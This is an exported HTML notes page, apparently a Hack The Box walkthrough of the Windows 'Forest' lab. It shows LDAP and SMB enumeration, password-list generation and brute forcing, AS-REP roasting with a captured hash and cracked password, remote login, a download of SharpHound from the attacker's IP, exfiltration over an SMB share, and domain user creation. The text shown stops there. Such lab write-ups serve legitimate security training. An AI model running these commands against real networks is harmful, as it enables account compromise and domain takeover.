<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>forest</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#forest">forest</a></p>
<ol>
<li><a href="#nmapAutomator">nmapAutomator</a></li>
<ol>
<li><a href="#nmap quickscan">nmap quickscan</a></li>
<li><a href="#nmap basic scan">nmap basic scan</a></li>
<li><a href="#nmap UDP scan">nmap UDP scan</a></li>
<li><a href="#nmap full scan">nmap full scan</a></li>
<li><a href="#nmap vulns scan">nmap vulns scan</a></li>
<li><a href="#Recon Recommendations">Recon Recommendations</a></li>
<ol>
<li><a href="#smb recon">smb recon</a></li>
<li><a href="#ldap recon">ldap recon</a></li>
</ol>
</ol>
<li><a href="#ldap">ldap</a></li>
<ol>
<li><a href="#recon suggestion from nmapAuto">recon suggestion from nmapAuto</a></li>
<li><a href="#ldapsearch w/ DC">ldapsearch w/ DC</a></li>
<ol>
<li><a href="#grep -i memberof">grep -i memberof</a></li>
<li><a href="#search objectclass person">search objectclass person</a></li>
<ol>
<li><a href="#grep sAMAccountName">grep sAMAccountName</a></li>
<li><a href="#userlist.ldap">userlist.ldap</a></li>
<li><a href="#extra username in rpcclient">extra username in rpcclient</a></li>
</ol>
</ol>
</ol>
<li><a href="#Initial Foothold ">Initial Foothold </a></li>
<ol>
<li><a href="#smb">smb</a></li>
<li><a href="#password spray user accts w/ custom password list">password spray user accts w/ custom password list</a></li>
<ol>
<li><a href="#hashcat best64 rule">hashcat best64 rule</a></li>
<li><a href="#add !s / toggle1.rule">add !s / toggle1.rule</a></li>
<li><a href="#make passwords length 7 minimum">make passwords length 7 minimum</a></li>
<li><a href="#crackmapexec">crackmapexec</a></li>
<ol>
<li><a href="#null authentication allows domain enumeration">null authentication allows domain enumeration</a></li>
<li><a href="#crackmapexec Brute Force">crackmapexec Brute Force</a></li>
</ol>
<li><a href="#enum4linux">enum4linux</a></li>
</ol>
<li><a href="#getNPUsers.py">getNPUsers.py</a></li>
<ol>
<li><a href="#hashcat BF ticket">hashcat BF ticket</a></li>
<li><a href="#evil-winrm">evil-winrm</a></li>
</ol>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#sharphound">sharphound</a></li>
<ol>
<li><a href="#run SharpHound.exe on victim">run SharpHound.exe on victim</a></li>
<li><a href="#encode/copy/paste files back to attack machine">encode/copy/paste files back to attack machine</a></li>
<li><a href="#OR set up smb share between attack and victim machines">OR set up smb share between attack and victim machines</a></li>
</ol>
<li><a href="#neo4j">neo4j</a></li>
<ol>
<li><a href="#bloodhound">bloodhound</a></li>
<li><a href="#shortest path from owned Principals">shortest path from owned Principals</a></li>
<ol>
<li><a href="#query: shortest path to domain admin from owned principles">query: shortest path to domain admin from owned principles</a></li>
<li><a href="#WritedACL Abuse info">WritedACL Abuse info</a></li>
</ol>
<li><a href="#report summary">report summary</a></li>
</ol>
<li><a href="#attackpath">attackpath</a></li>
<ol>
<li><a href="#Create a user on the domain">Create a user on the domain</a></li>
<li><a href="#Add the user to the Exchange Windows Permission group">Add the user to the Exchange Windows Permission group</a></li>
<li><a href="#Give the user DcSync privileges">Give the user DcSync privileges</a></li>
<ol>
<li><a href="#Add-DomainObjectAcl error">Add-DomainObjectAcl error</a></li>
</ol>
<li><a href="#Perform a DcSync attack and dump the password hashes of all the users on the domain">Perform a DcSync attack and dump the password hashes of all the users on the domain</a></li>
<li><a href="#Perform a Pass the Hash attack to get access to the administrator’s account">Perform a Pass the Hash attack to get access to the administrator’s account</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#Lessons Learned">Lessons Learned</a></li>
</ol></div>
<div class="page" id="forest"><h1><b><u>forest</u></b></h1><img alt="images/1137-1.png" src="images/1137-1.png"/><br/><img alt="images/1137-2.png" src="images/1137-2.png"/></div>
<div class="page" id="nmapAutomator"><h1><b><u>nmapAutomator</u></b></h1><span style="color:#24ff00;">lets start off using </span><span style="color:#ffff00;">Tib3rius' </span><span style="color:#24ff00;">autorecon tool</span><br/><span style="color:#ffa500;">nmapautomator.sh 10.10.10.161 All</span><br/><span style="color:#ffa500;">• nmap quickscan<br/>• nmap basic scan<br/>• nmap UDP scan<br/>• nmap full scan<br/>• nmap vulns scan<br/>• Recon Recommendations<br/></span><br/><img alt="images/1138-1.png" src="images/1138-1.png"/><br/><span style="color:#24ff00;">Notes:<br/><br/>1. Since the </span><span style="color:#ffa500;">Kerberos</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">LDAP</span><span style="color:#24ff00;"> services are running, chances are we’re dealing with a</span><span style="color:#ffff00;"> Windows Active Directory</span><span style="color:#24ff00;"> box.<br/>2. The </span><span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> scan leaks the domain and hostname: </span><span style="color:#ffa500;">htb.local </span><span style="color:#24ff00;">and </span><span style="color:#ffa500;">FOREST.htb.local</span><span style="color:#24ff00;">. Similarly, the SMB OS nmap scan leaks the operating system: Windows Server 2016 Standard 14393.<br/>3. Port </span><span style="color:#ffa500;">389</span><span style="color:#24ff00;"> is running </span><span style="color:#ffa500;">LDAP</span><span style="color:#24ff00;">. We’ll need to query it for any useful information. Same goes for </span><span style="color:#ffa500;">SMB</span><span style="color:#24ff00;">.<br/>4. The </span><span style="color:#ffa500;">WSMan</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">WinRM</span><span style="color:#24ff00;"> services are open. If we find </span><span style="color:#ffff00;">credentials</span><span style="color:#24ff00;"> through </span><span style="color:#ffa500;">SMB</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">LDAP</span><span style="color:#24ff00;">, we can use these services to remotely connect to the box.</span></div>
<div class="page" id="nmap quickscan"><h1><b><u>nmap quickscan</u></b></h1><img alt="images/1139-1.png" src="images/1139-1.png"/></div>
<div class="page" id="nmap basic scan"><h1><b><u>nmap basic scan</u></b></h1><img alt="images/1140-1.png" src="images/1140-1.png"/><br/><img alt="images/1140-2.png" src="images/1140-2.png"/></div>
<div class="page" id="nmap UDP scan"><h1><b><u>nmap UDP scan</u></b></h1><img alt="images/1141-1.png" src="images/1141-1.png"/><br/><br/><br/><img alt="images/1141-2.png" src="images/1141-2.png"/><br/></div>
<div class="page" id="nmap full scan"><h1><b><u>nmap full scan</u></b></h1><img alt="images/1142-1.png" src="images/1142-1.png"/><br/><br/><img alt="images/1142-2.png" src="images/1142-2.png"/><br/><br/></div>
<div class="page" id="nmap vulns scan"><h1><b><u>nmap vulns scan</u></b></h1><img alt="images/1143-1.png" src="images/1143-1.png"/><br/><br/><span style="color:#ffa500;">all failed*</span></div>
<div class="page" id="Recon Recommendations"><h1><b><u>Recon Recommendations</u></b></h1><img alt="images/1144-1.png" src="images/1144-1.png"/><br/><br/></div>
<div class="page" id="smb recon"><h1><b><u>smb recon</u></b></h1><img alt="images/1146-1.png" src="images/1146-1.png"/></div>
<div class="page" id="ldap recon"><h1><b><u>ldap recon</u></b></h1><img alt="images/1147-1.png" src="images/1147-1.png"/></div>
<div class="page" id="ldap"><h1><b><u>ldap</u></b></h1><span style="color:#24ff00;">thanks to naming context, we know the domain controller is htb, and local</span><br/><br/><span style="color:#ffa500;">ldapsearch -h 10.10.10.161 -x -s base namingcontexts</span><br/><img alt="images/1149-1.png" src="images/1149-1.png"/><br/><span style="color:#ffff00;">DC=htb, DC=local</span></div>
<div class="page" id="recon suggestion from nmapAuto"><h1><b><u>recon suggestion from nmapAuto</u></b></h1><span style="color:#24ff00;">we can enumerate the ldap service with </span><span style="color:#ffa500;">ldapsearch</span><br/><br/><span style="color:#ffa500;">ldapsearch -x -h 10.10.10.161 -s base | tee recon/ldapsearch_10.10.10.161.txt</span><br/><img alt="images/1150-1.png" src="images/1150-1.png"/></div>
<div class="page" id="ldapsearch w/ DC"><h1><b><u>ldapsearch w/ DC</u></b></h1><img alt="images/1152-1.png" src="images/1152-1.png"/><br/><br/><span style="color:#24ff00;">where</span><h1><br/> </h1><img alt="images/1152-2.png" src="images/1152-2.png"/><br/><img alt="images/1152-3.png" src="images/1152-3.png"/></div>
<div class="page" id="grep -i memberof"><h1><b><u>grep -i memberof</u></b></h1><img alt="images/1153-1.png" src="images/1153-1.png"/></div>
<div class="page" id="search objectclass person"><h1><b><u>search objectclass person</u></b></h1><span style="color:#ffa500;">ldapsearch -h 10.10.10.161 -x -b "DC=htb, DC=local" '(objectclass=person)'</span><br/><img alt="images/1154-1.png" src="images/1154-1.png"/><span style="color:#24ff00;"><br/><br/>we got </span><span style="color:#ffff00;">santi rodriguez </span><br/><img alt="images/1154-2.png" src="images/1154-2.png"/><br/><br/>sAMAccountName: <span style="color:#ffff00;">santi</span><span style="color:#24ff00;"><br/>sAMAccountType: </span><span style="color:#ffff00;">805306368</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1154-3.png" src="images/1154-3.png"/><br/><br/>we can filter our ldapsearch to only output information that's important to us<br/><br/>lets filter our search down to <span style="color:#ffa500;">sAMAccountName</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">sAMAccountType</span><br/><img alt="images/1154-4.png" src="images/1154-4.png"/><br/><br/></div>
<div class="page" id="grep sAMAccountName"><h1><b><u>grep sAMAccountName</u></b></h1><span style="color:#24ff00;">we're gathering all these AccountNames so we can password spray them</span><br/><img alt="images/1155-1.png" src="images/1155-1.png"/></div>
<div class="page" id="userlist.ldap"><h1><b><u>userlist.ldap</u></b></h1><span style="color:#24ff00;">we're going to use </span><span style="color:#ffa500;">grep</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">awk</span><span style="color:#24ff00;"> to put all these accounts into a file</span><br/><br/><span style="color:#ffa500;">ldapsearch -h 10.10.10.161 -x -b "DC=htb, DC=local" '(objectclass=Person)' SAMAccountName SamAccountType | grep SAMAccountName | awk '{print $2}'</span><br/><img alt="images/1156-1.png" src="images/1156-1.png"/><br/><br/><span style="color:#24ff00;">gives us a very clean list of users </span><br/><img alt="images/1156-2.png" src="images/1156-2.png"/><br/><span style="color:#24ff00;">we want to narrow these down to user accounts and not service accounts since those are automaticaly generated and practically impossible to crack<br/><br/>list ends up looking like this</span><br/><img alt="images/1156-3.png" src="images/1156-3.png"/><br/><br/></div>
<div class="page" id="extra username in rpcclient"><h1><b><u>extra username in rpcclient</u></b></h1><span style="color:#24ff00;">rpclient domuser command shows us we're missing a user account!<br/><br/></span><span style="color:#ffa500;">rpcclient -U '' 10.10.10.161</span><br/><img alt="images/1165-1.png" src="images/1165-1.png"/><br/><br/>by connecting the rpc client and issuing <span style="color:#ffa500;">enumdomusers</span><span style="color:#24ff00;"> we </span><strong><span style="color:#24ff00;">see</span></strong><span style="color:#24ff00;"> </span><img alt="images/1165-2.png" src="images/1165-2.png"/> is an account we missed!<br/><img alt="images/1165-3.png" src="images/1165-3.png"/><br/><img alt="images/1165-4.png" src="images/1165-4.png"/><br/><br/><br/><img alt="images/1165-5.png" src="images/1165-5.png"/><br/><img alt="images/1165-6.png" src="images/1165-6.png"/><br/><span style="color:#ffff00;">svc-alfesco</span></div>
<div class="page" id="Initial Foothold "><h1><b><u>Initial Foothold </u></b></h1><br/><br/><br/></div>
<div class="page" id="smb"><h1><b><u>smb</u></b></h1><span style="color:#24ff00;">lets enumerate the smb share as well with </span><span style="color:#ffa500;">smbmap</span><span style="color:#24ff00;">/</span><span style="color:#ffa500;">smbclient</span><br/><br/><span style="color:#ffa500;">smbmap -H 10.10.10.161</span><br/><img alt="images/1148-1.png" src="images/1148-1.png"/><br/><br/><span style="color:#ffa500;">smbclient -L //10.10.10.161////</span><br/><img alt="images/1148-2.png" src="images/1148-2.png"/><br/><br/><span style="color:#ff0000;">nothing</span><span style="color:#24ff00;"> here but we can try </span><span style="color:#ffa500;">bruteforcing</span><span style="color:#24ff00;"> a login with userlist and pwlist</span><br/><br/></div>
<div class="page" id="password spray user accts w/ custom password list"><h1><b><u>password spray user accts w/ custom password list</u></b></h1><span style="color:#24ff00;">we want to save time and not use rockyou so we're going to make our own<br/></span><img alt="images/1157-1.png" src="images/1157-1.png"/><br/><img alt="images/1157-2.png" src="images/1157-2.png"/><br/><br/><br/>we can add years to the list with a <span style="color:#ffa500;">bashscript</span><br/><span style="color:#ffa500;">for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done</span><br/><img alt="images/1157-3.png" src="images/1157-3.png"/><br/><img alt="images/1157-4.png" src="images/1157-4.png"/><br/><br/>store the wordlist in a temp file t and mv it to pwlist.txt<br/><span style="color:#ffa500;">for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done</span> &gt; t<br/><img alt="images/1157-5.png" src="images/1157-5.png"/><br/><span style="color:#ffa500;">mv t pwlist.txt</span><br/><img alt="images/1157-6.png" src="images/1157-6.png"/><br/><br/>it would be <span style="color:#ffff00;">laughable</span><span style="color:#24ff00;"> if the password was in this list, but we can make the list much more complex with the help of</span> <span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"><br/><br/><br/><br/><br/></span></div>
<div class="page" id="hashcat best64 rule"><h1><b><u>hashcat best64 rule</u></b></h1><span style="color:#24ff00;">using the </span><span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"> rule best64 will complexify our pwlist<br/><br/></span><span style="color:#ffa500;">hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule</span><br/><img alt="images/1158-1.png" src="images/1158-1.png"/><br/><img alt="images/1158-2.png" src="images/1158-2.png"/><br/><br/>this mutates our original password list and does a lot of really cool things!<br/></div>
<div class="page" id="add !s / toggle1.rule"><h1><b><u>add !s / toggle1.rule</u></b></h1><span style="color:#24ff00;">our list doesnt have any exclamation points so lets go back and generate a wordlist that has them</span><br/><br/><span style="color:#ffa500;">for i in $(cat pwlist); do echo $i; echo ${i}\!; done</span><br/><img alt="images/1159-1.png" src="images/1159-1.png"/><br/><span style="color:#ffa500;">cat t</span><br/><img alt="images/1159-2.png" src="images/1159-2.png"/><br/><br/><span style="color:#24ff00;">copy our temp wordlist </span><span style="color:#ffa500;">t</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">pwlist.txt</span><br/><img alt="images/1159-3.png" src="images/1159-3.png"/><br/><br/><img alt="images/1159-4.png" src="images/1159-4.png"/><br/><br/><span style="color:#24ff00;">we can also chain rules like toggles to mix uppercase and lower case letters<br/><br/></span><img alt="images/1159-5.png" src="images/1159-5.png"/><br/><br/>after using these rules we have a total of 50000+ passwords we're going to use!<br/><img alt="images/1159-6.png" src="images/1159-6.png"/><br/><br/><br/><br/></div>
<div class="page" id="make passwords length 7 minimum"><h1><b><u>make passwords length 7 minimum</u></b></h1><span style="color:#24ff00;">last we're going to ensure our passwords are </span><span style="color:#ffff00;">at least</span><span style="color:#24ff00;"> 7 characters long</span><br/><br/><span style="color:#ffa500;">awk 'length($0) &gt; 7' | wc -l</span><br/><img alt="images/1160-1.png" src="images/1160-1.png"/><br/><br/><span style="color:#24ff00;">we see limiting our password list to have passwords to be at least 7 characters or greater has narrowed our list down from 50k to ~40k</span><br/><img alt="images/1160-2.png" src="images/1160-2.png"/><br/><br/><span style="color:#24ff00;">output to t<br/></span><img alt="images/1160-3.png" src="images/1160-3.png"/><br/><br/>and <span style="color:#ffa500;">cp t pwlist.txt</span><br/><img alt="images/1160-4.png" src="images/1160-4.png"/><br/></div>
<div class="page" id="crackmapexec"><h1><b><u>crackmapexec</u></b></h1><img alt="images/1161-1.png" src="images/1161-1.png"/><br/><br/><span style="color:#24ff00;">we can also do whats called a </span><span style="color:#ffff00;">crackmapexec null authentication attempt</span><span style="color:#24ff00;"><br/>where we fille the username and password parameters with empty strings<br/></span><img alt="images/1161-2.png" src="images/1161-2.png"/><br/>it doesnt' work but it does allow domain enumeration (see child node)<br/><br/>important: thanks to null authentication enumeration we see that there is  no account lockout and we're free to brute force<br/><img alt="images/1161-3.png" src="images/1161-3.png"/> <br/><br/><br/><br/></div>
<div class="page" id="null authentication allows domain enumeration"><h1><b><u>null authentication allows domain enumeration</u></b></h1><img alt="images/1163-1.png" src="images/1163-1.png"/><br/><br/><span style="color:#24ff00;">domain enumeration</span><br/><img alt="images/1163-2.png" src="images/1163-2.png"/><br/><img alt="images/1163-3.png" src="images/1163-3.png"/><br/><br/><img alt="images/1163-4.png" src="images/1163-4.png"/><br/><br/></div>
<div class="page" id="crackmapexec Brute Force"><h1><b><u>crackmapexec Brute Force</u></b></h1><span style="color:#24ff00;">now that we've generated our password list, lets use our </span><span style="color:#ffa500;">ldap userlist </span><span style="color:#24ff00;">along with our </span><span style="color:#ffa500;">custom password list</span><span style="color:#24ff00;"> and try to brute force our way into the smb share</span><br/><span style="color:#ffa500;">crackmapexec smb 10.10.10.161 -u userlist.ldap -p pwlist.txt</span><br/><img alt="images/1164-1.png" src="images/1164-1.png"/><br/><br/><span style="color:#24ff00;">will run for a while so keep it open and keep checking back, will fail a lot!</span><br/><br/><span style="color:#24ff00;">heres a taste of the output</span><br/><img alt="images/1164-2.png" src="images/1164-2.png"/><br/><br/></div>
<div class="page" id="enum4linux"><h1><b><u>enum4linux</u></b></h1><span style="color:#24ff00;">real ugly output so not going to bother pasting besides a few enumeration things we already found out<br/><br/></span><span style="color:#ffa500;">enum4linux 10.10.10.161</span><br/><img alt="images/1162-1.png" src="images/1162-1.png"/><br/><br/><img alt="images/1162-2.png" src="images/1162-2.png"/>users<br/><br/><img alt="images/1162-3.png" src="images/1162-3.png"/></div>
<div class="page" id="getNPUsers.py"><h1><b><u>getNPUsers.py</u></b></h1><span style="color:#24ff00;">If </span><span style="color:#ffa500;">kerberos pre-authentication </span><span style="color:#24ff00;">is disabled on any of the box's accounts, we can use the </span><span style="color:#ffa500;">GetNPUsers</span><span style="color:#24ff00;"> impacket script to send a dummy request for authentication. The </span><span style="color:#ffa500;">Key Distribution Center KDC </span><span style="color:#24ff00;">will then return a </span><span style="color:#ffa500;">Ticket Generating Ticket TGT</span><span style="color:#24ff00;"> that is encrypted with the user's password. From there, we can take the encrypted TGT, run it through a password cracker and brute force the password</span><br/><br/><span style="color:#ffa500;">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request</span><br/><img alt="images/1167-1.png" src="images/1167-1.png"/><br/><img alt="images/1167-2.png" src="images/1167-2.png"/><span style="color:#24ff00;"><br/>the </span><span style="color:#ffa500;">Kerberos pre-authentication </span><span style="color:#24ff00;">option has been disabled fr the user </span><span style="color:#ffa500;">svc-alfresco</span><span style="color:#24ff00;"> and the KDC gave us back a TGT with the user's password<br/><br/></span><span style="color:#ffff00;">$krb5asrep$23$svc-alfresco@HTB.LOCAL:4933542ada6053e22fa16eacac49dc5d$6f4f91cc61441ebca25cad737b2941e4349126068e0e575b7b13d0ff5b748acfb529e8d18353750a618ef3a16e506ad9e9beb93e932f2fc088357d0fe8e3180d69c572d7561d62d5dd31fce165b10088f3a79f6b0a7d31f1dd6209e08e42d14f540a909f2803b182d588a9f3171c99282c88d29c17e9774c7f69c0e60a9c12f2cb2f2440468f61684b8f6e992e2b10b7620c9bd8891e6f7978cdb665e29417df2bd6f2003373babc82a92d07a1e9cf5a8566da337aee509bccbc8975e5ec749f201158e24730c811a485b9d810ea92df5cf741591d8a98ed44295cb750cd29f755b85a26f63c</span><span style="color:#24ff00;"><br/><br/>lets save the ticket to </span><span style="color:#ffa500;">hash.txt</span><br/><br/></div>
<div class="page" id="hashcat BF ticket"><h1><b><u>hashcat BF ticket</u></b></h1><img alt="images/1168-1.png" src="images/1168-1.png"/><br/><img alt="images/1168-2.png" src="images/1168-2.png"/> so we know the module is either <span style="color:#ffa500;">13100</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">18200</span><span style="color:#24ff00;"><br/><br/></span><span style="color:#ffa500;">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br/><img alt="images/1168-3.png" src="images/1168-3.png"/><br/><img alt="images/1168-4.png" src="images/1168-4.png"/><br/><br/><span style="color:#ffa500;">svc-alfresco</span><span style="color:#24ff00;"><br/>password = </span><span style="color:#ffff00;">s3rvice</span><span style="color:#24ff00;"><br/><br/></span></div>
<div class="page" id="evil-winrm"><h1><b><u>evil-winrm</u></b></h1><span style="color:#24ff00;">now that we have the username and password we can use evil-winrm script to gain an initial foothold onto the box. This is only possible because the WinRM and WSMan services are open <br/><br/></span><span style="color:#ffa500;">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span><br/><img alt="images/1169-1.png" src="images/1169-1.png"/><br/><br/>and we're in! we can grab the <span style="color:#ffff00;">userflag</span></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#24ff00;">thanks to </span><span style="color:#ffa500;">win-rm</span><span style="color:#24ff00;"> with </span><span style="color:#ffa500;">svc-alfresco's</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">credentials</span><span style="color:#24ff00;">, we've gained an initial foothold on the box<br/><br/>we can issue </span><span style="color:#ffa500;">net user /domain </span><span style="color:#24ff00;">to confirm the AD accounts<br/></span><img alt="images/1174-1.png" src="images/1174-1.png"/><br/><img alt="images/1174-2.png" src="images/1174-2.png"/><br/>and check out what type of user <span style="color:#ffa500;">svc-alfresco </span><span style="color:#24ff00;">is <br/><br/></span><img alt="images/1174-3.png" src="images/1174-3.png"/><br/><br/>from this info we see <span style="color:#ffa500;">svc-alfresco</span><span style="color:#24ff00;"> is both a domain user and a service account:<br/></span><img alt="images/1174-4.png" src="images/1174-4.png"/><br/><br/><br/></div>
<div class="page" id="sharphound"><h1><b><u>sharphound</u></b></h1><span style="color:#24ff00;">from here lets run </span><span style="color:#ffa500;">sharphound</span><span style="color:#24ff00;"> to see if there are any exploitable paths to </span><span style="color:#ffff00;">privesc</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1173-1.png" src="images/1173-1.png"/><br/><img alt="images/1173-2.png" src="images/1173-2.png"/><br/><br/>we're going to want to download and run this file to our victim box on our svc-alfresco account<br/><br/>1) set up http server<br/><img alt="images/1173-3.png" src="images/1173-3.png"/><br/><img alt="images/1173-4.png" src="images/1173-4.png"/><br/><br/>2) get the latest version of <span style="color:#ffa500;">bloodhound</span><span style="color:#24ff00;"> since it is updated regularly<br/></span><img alt="images/1173-5.png" src="images/1173-5.png"/><br/><img alt="images/1173-6.png" src="images/1173-6.png"/><br/><br/>3) Download <span style="color:#ffa500;">SharpHound.exe</span><span style="color:#24ff00;"> onto our victim machine and run it</span><br/><br/><span style="color:#ffa500;">(new-object system.net.webclient).downloadfile('http://10.10.14.62:5555/SharpHound.exe', 'C:\Users\svc-alfresco\Documents\SharpHound.exe')</span><br/><br/><img alt="images/1173-7.png" src="images/1173-7.png"/><br/><br/><img alt="images/1173-8.png" src="images/1173-8.png"/></div>
<div class="page" id="run SharpHound.exe on victim"><h1><b><u>run SharpHound.exe on victim</u></b></h1><span style="color:#ffa500;">.\SharpHound.exe -c all</span><br/><img alt="images/1175-1.png" src="images/1175-1.png"/><br/><br/><img alt="images/1175-2.png" src="images/1175-2.png"/></div>
<div class="page" id="encode/copy/paste files back to attack machine"><h1><b><u>encode/copy/paste files back to attack machine</u></b></h1><img alt="images/1176-1.png" src="images/1176-1.png"/><span style="color:#24ff00;"><br/><br/>we want to run </span><img alt="images/1176-2.png" src="images/1176-2.png"/> on  our attack machine<br/><br/>We need to transfer the ZIP file to our attack machine. To do that, <span style="color:#ffff00;">base64 encode</span><span style="color:#24ff00;"> the file.<br/><br/></span><img alt="images/1176-3.png" src="images/1176-3.png"/><br/><img alt="images/1176-4.png" src="images/1176-4.png"/><br/><span style="color:#ffa500;">certutil -encode </span><span style="color:#24ff00;"><br/><br/>Then output the </span><span style="color:#ffff00;">base64</span><span style="color:#24ff00;"> encoded file.<br/><br/></span><img alt="images/1176-5.png" src="images/1176-5.png"/><br/>Copy it and base64 decode it on the attack machine.<br/><br/><img alt="images/1176-6.png" src="images/1176-6.png"/><br/><br/>Drag and drop the zipped file into <span style="color:#ffa500;">BloodHound</span><span style="color:#24ff00;">. Then set the start node to be the svc-alfresco user.<br/><br/><br/></span></div>
<div class="page" id="OR set up smb share between attack and victim machines"><h1><b><u>OR set up smb share between attack and victim machines</u></b></h1><span style="color:#24ff00;">first we want to set up our smb server on our attacking machine, we'll use </span><span style="color:#ffa500;">impacket's -smbserver </span><span style="color:#24ff00;">to initialize it<br/><br/></span><span style="color:#ffa500;">impacket -smbserver PleaseSubscribe $(pwd) -smb2support -user ippsec -password SupportMeOnPatreon</span><span style="color:#24ff00;"><br/>where<br/>name is </span><span style="color:#ffa500;">PleaseSubscribe</span><br/><span style="color:#ffa500;">$(PWD) </span><span style="color:#24ff00;">shares the current directory  <br/>-smb2support<br/>-user set to </span><span style="color:#ffa500;">ippsec</span><span style="color:#24ff00;"><br/>-password set to </span><span style="color:#ffa500;">SupportMeOnPatreon</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1179-1.png" src="images/1179-1.png"/><br/><br/><br/><strong>from here we need to store these credentials in a variable on our victim machine</strong><br/>1. set our password to the variable <span style="color:#ffa500;">$pass</span><img alt="images/1179-2.png" src="images/1179-2.png"/><span style="color:#24ff00;"><br/> </span><span style="color:#ffa500;">$pass= convertto-securestring ‘SupportMeOnPatreon’ -AsPlainText -Force</span><span style="color:#24ff00;"><br/>2. now we create a </span><span style="color:#ffa500;">cred</span><span style="color:#24ff00;"> variable and add our </span><span style="color:#ffff00;">username</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">pass</span><img alt="images/1179-3.png" src="images/1179-3.png"/><span style="color:#24ff00;"><br/> </span><span style="color:#ffa500;">$cred = New-Object System.Management.Automation.PSCredential('ippsec', $pass)</span><span style="color:#24ff00;"><br/>3. now we connect to our smbserver from our victim machine with this command</span><img alt="images/1179-4.png" src="images/1179-4.png"/><br/><span style="color:#ffa500;">    New-PSDrive -Name ippsec -PSProvider FileSystem -Credential $cred -Root \\10.10.14.62\PleaseSubscribe</span><span style="color:#24ff00;"><br/><br/>and we're connected! impacket server shoots back this message:<br/> </span><img alt="images/1179-5.png" src="images/1179-5.png"/><img alt="images/1179-6.png" src="images/1179-6.png"/><br/><br/><br/><br/><br/></div>
<div class="page" id="neo4j"><h1><b><u>neo4j</u></b></h1><span style="color:#24ff00;">lets set up the bloodhound database on our attacking machine:</span><br/><br/><span style="color:#ffa500;">neo4j console</span><br/><img alt="images/1177-1.png" src="images/1177-1.png"/><br/><img alt="images/1177-2.png" src="images/1177-2.png"/><br/><br/></div>
<div class="page" id="bloodhound"><h1><b><u>bloodhound</u></b></h1><span style="color:#24ff00;">now lets run </span><span style="color:#ffa500;">bloodhound</span><span style="color:#24ff00;"> from our attacking machine and load in our </span><span style="color:#ffff00;">report file</span><span style="color:#24ff00;"> </span><img alt="images/1178-1.png" src="images/1178-1.png"/> extracted from our victim<br/><br/><br/><img alt="images/1178-2.png" src="images/1178-2.png"/><br/><br/><span style="color:#24ff00;">now drag and drop our zip file into </span><span style="color:#ffa500;">bloodhound</span><br/><img alt="images/1178-3.png" src="images/1178-3.png"/> <br/><br/><br/><img alt="images/1178-4.png" src="images/1178-4.png"/><br/><br/><span style="color:#24ff00;">mark the user </span><span style="color:#ffa500;">svc_alfresco </span><span style="color:#24ff00;">as owned</span><br/><img alt="images/1178-5.png" src="images/1178-5.png"/><br/><br/><span style="color:#24ff00;">and query </span><span style="color:#ffa500;">shortest path from owned Principals</span><br/><img alt="images/1178-6.png" src="images/1178-6.png"/></div>
<div class="page" id="shortest path from owned Principals"><h1><b><u>shortest path from owned Principals</u></b></h1><img alt="images/1180-1.png" src="images/1180-1.png"/></div>
<div class="page" id="query: shortest path to domain admin from owned principles"><h1><b><u>query: shortest path to domain admin from owned principles</u></b></h1><img alt="images/1171-1.png" src="images/1171-1.png"/><br/><br/><span style="color:#24ff00;">This query shows that</span><span style="color:#ffa500;"> svc_alfresco</span><span style="color:#24ff00;"> is a member of the </span><span style="color:#ffa500;">service accounts</span><span style="color:#24ff00;"> with is a member of the </span><span style="color:#ffa500;">account operators</span><span style="color:#24ff00;"> which have </span><span style="color:#ffff00;">WriteDacl</span><span style="color:#24ff00;"> Permissions which can </span><span style="color:#ffff00;">create</span><span style="color:#24ff00;"> an account as administrator!</span><br/><img alt="images/1171-2.png" src="images/1171-2.png"/></div>
<div class="page" id="WritedACL Abuse info"><h1><b><u>WritedACL Abuse info</u></b></h1><span style="color:#24ff00;">we go over utilizing this abuse in the attackpath node:<br/><br/></span><img alt="images/1189-1.png" src="images/1189-1.png"/><br/><br/><br/><img alt="images/1189-2.png" src="images/1189-2.png"/><br/>(we also add<span style="color:#ffa500;"> -PrincipalIdentity &lt;user&gt; </span><span style="color:#24ff00;">in this statement, more on this later)<br/><br/></span></div>
<div class="page" id="report summary"><h1><b><u>report summary</u></b></h1><img alt="images/1181-1.png" src="images/1181-1.png"/></div>
<div class="page" id="attackpath"><h1><b><u>attackpath</u></b></h1><img alt="images/1183-1.png" src="images/1183-1.png"/></div>
<div class="page" id="Create a user on the domain"><h1><b><u>Create a user on the domain</u></b></h1><span style="color:#ffa500;">net user &lt;user&gt; &lt;password&gt; /add /domain</span><br/><img alt="images/1182-1.png" src="images/1182-1.png"/><strong><br/></strong><br/><span style="color:#ffa500;">net user /domain</span><br/><img alt="images/1182-2.png" src="images/1182-2.png"/><br/><span style="color:#24ff00;">we see our account </span><img alt="images/1182-3.png" src="images/1182-3.png"/> was created</div>
